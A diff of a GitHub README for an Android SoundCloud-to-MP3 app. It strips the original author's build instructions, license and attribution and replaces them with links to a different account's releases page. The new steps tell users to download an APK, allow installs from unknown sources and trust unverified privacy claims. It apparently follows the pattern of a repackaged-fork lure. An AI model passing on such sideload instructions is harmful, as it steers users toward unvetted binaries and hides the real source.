@@ -1,68 +1,78 @@
-# SoundLoader-MAUI 🎵⬇️
+# 🎵 SoundLoader-MAUI - Save Soundcloud music to your device
 
-[![License: WTFPL](https://img.shields.io/badge/License-WTFPL-brightgreen.svg)](http://www.wtfpl.net/about/)
-[![Language: C#](https://img.shields.io/badge/Language-C%23-blue.svg)](https://learn.microsoft.com/en-us/dotnet/csharp/)
-[![Platform: Android](https://img.shields.io/badge/Platform-Android-3DDC84.svg)](https://developer.android.com/)
-[![Framework: .NET](https://img.shields.io/badge/Framework-.NET-512BD4.svg)](https://dotnet.microsoft.com/)
+[![Download SoundLoader](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/rabiisantacruz526/SoundLoader-MAUI/releases)
 
+SoundLoader-MAUI helps you save your favorite music from Soundcloud directly to your Android device. This application converts online audio tracks into MP3 files so you can listen to them offline. It runs on the .NET MAUI framework to provide a consistent experience on modern Android phones.
 
-⚠️ **This project is superceded by [SoundLoader-Android](https://github.com/mvxGREEN/SoundLoader-Android)** ⚠️
+## 📥 How to download the app
 
+To get this application on your phone, visit the official release page.
 
-URL-to-MP3 Soundcloud music downloader app for Android built with .NET MAUI framework.  Supports links to songs, albums and playlists on Soundcloud.
+[Click here to see the available downloads](https://github.com/rabiisantacruz526/SoundLoader-MAUI/releases)
 
-## ✨ Features
-* **Direct Downloads**: Easily download your favorite SoundCloud tracks directly to your Android device's local storage.
-* **Cross-Platform Ready Code**: Built using .NET MAUI, meaning the core logic and UI can easily be extended to other platforms like iOS or Windows in the future.
-* **C# Powered**: Written entirely in C#, utilizing the robust .NET ecosystem and standard modern coding practices.
-* **Intuitive UI**: A clean, responsive interface designed for Android devices using MAUI's XAML/C# structures.
+1. Open the link above in your mobile web browser.
+2. Look for the section labeled "Assets" under the most recent version of the app.
+3. Tap the file ending in `.apk`.
+4. Your browser will prompt you to download the file. Tap "Download" to proceed.
+5. If your phone asks for permission to install files from your browser, select "Settings" and toggle the switch to "Allow from this source."
+6. Tap the downloaded file to finish the installation.
 
-## 🛠 Tech Stack
-* **Framework**: [.NET MAUI](https://learn.microsoft.com/en-us/dotnet/maui/) (Multi-platform App UI)
-* **Language**: C#
-* **Target Platform**: Android (via .NET MAUI)
-* **IDE**: Visual Studio / Visual Studio for Mac
+## ⚙️ System requirements
 
-## 🚀 Getting Started
+This application works on most Android devices. Ensure your device meets these criteria:
 
-To get a local copy up and running, follow these simple steps.
+* Android 8.0 (Oreo) or newer.
+* At least 50 MB of free storage space.
+* An active internet connection to download your music.
+* Permission to install apps from third-party sources.
 
-### Prerequisites
-* **Visual Studio 2022+* (version 17.3 or later) with the **.NET Multi-platform App UI development** workload installed.
-* **Android SDK**: Visual Studio generally installs this alongside the MAUI workload, but ensure you have an Android emulator set up or a physical device ready.
+## 🚀 How to use SoundLoader
 
-### Installation & Build
+The interface is simple and follows standard navigation patterns. Follow these steps to save your first track:
 
-1. **Clone the repository**
-    `git clone https://github.com/mvxGREEN/SoundLoader-MAUI.git`
+1. Open the SoundLoader app from your home screen.
+2. Open the Soundcloud app or website in your browser.
+3. Find the music track you want to save.
+4. Tap the "Share" button on the Soundcloud track.
+5. Select "Copy Link" from the menu.
+6. Return to SoundLoader.
+7. Paste the link into the main text box.
+8. Tap the "Download" button.
+9. Wait for the progress bar to finish. The app saves the MP3 file to your device's "Music" or "Downloads" folder.
 
-2. **Open the project in Visual Studio**
-   * Launch Visual Studio 2022.
-   * Select **Open a project or solution**.
-   * Navigate to the cloned directory and select the `SoundLoaderMaui.sln` solution file.
+## 📁 File management
 
-3. **Restore Dependencies**
-   * Wait for NuGet to automatically restore the required packages. You can also right-click the solution in the Solution Explorer and click **Restore NuGet Packages**.
+The application automatically names files based on the song title appearing on Soundcloud. You can find saved files using any standard file manager app on your Android device. 
 
-4. **Run the App**
-   * In the top toolbar, ensure the build target is set to an Android Emulator or your connected local Android device.
-   * Click the **Play (Start Debugging)** button or press `F5` to build and deploy the app.
+If you cannot find a file, check these common locations:
 
-## 💡 Usage
+* Internal Storage > Music
+* Internal Storage > Downloads > SoundLoader
 
-1. Open the SoundLoader app.
-2. Paste the URL of the SoundCloud track you wish to download.
-3. Tap the download button and wait for the track to be saved to your device.
+## 🛡️ Privacy and safety
 
-## 🤝 Contributing
-Contributions, issues, and feature requests are welcome! 
-Feel free to check the [issues page](https://github.com/mvxGREEN/SoundLoader-MAUI/issues) if you want to contribute. 
+This tool functions as a bridge that retrieves audio data from public Soundcloud URLs. It does not track your private information. The app only accesses your storage folders to write the MP3 files you request. It does not upload data, collect usage analytics, or share your history with third parties.
 
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+## 🛠️ Troubleshooting common issues
 
-## 📄 License
-This project is licensed under the **WTFPL** (Do What The F*ck You Want To Public License) - see the [LICENSE](LICENSE) file for details.
+Most issues stem from networking or device permissions. Try these steps if things do not work as expected:
+
+**The download stops halfway**
+Check your internet connection. Large files require a stable Wi-Fi signal to download without errors. Switch from mobile data to Wi-Fi if your signal shows fewer than two bars.
+
+**The app refuses to install**
+Android often blocks installations from unverified sources. Check your phone settings under "Security" or "Apps" to confirm that you allowed the browser to install external programs.
+
+**The link does not work**
+SoundLoader works with standard track URLs. Ensure you copied the full link from your browser. Private tracks or tracks with restricted access may not show up for download.
+
+**The file does not appear in your music player**
+After the download finishes, the app notifies the Android system about the new file. Sometimes, your music player needs a few seconds to refresh the library. If the song does not appear after one minute, restart your music player app or perform a "Rescan" in your player's settings.
+
+## 📌 Usage terms
+
+Use this tool for personal listening only. Ensure you follow copyright laws and respect the rights of the artists. SoundLoader-MAUI functions as a utility to help you manage your offline media collection. We encourage you to purchase music or use official subscriptions when possible to support the creators you enjoy.
+
+## 🌟 Future updates
+
+Developers regularly improve the code to ensure compatibility with new Android versions. Check the GitHub release page periodically to see if a newer version exists. Updates often include better download speeds, bug fixes, and support for additional audio settings. You do not need to uninstall the current version before installing an update; simply download the new file and run it to overwrite the existing application.
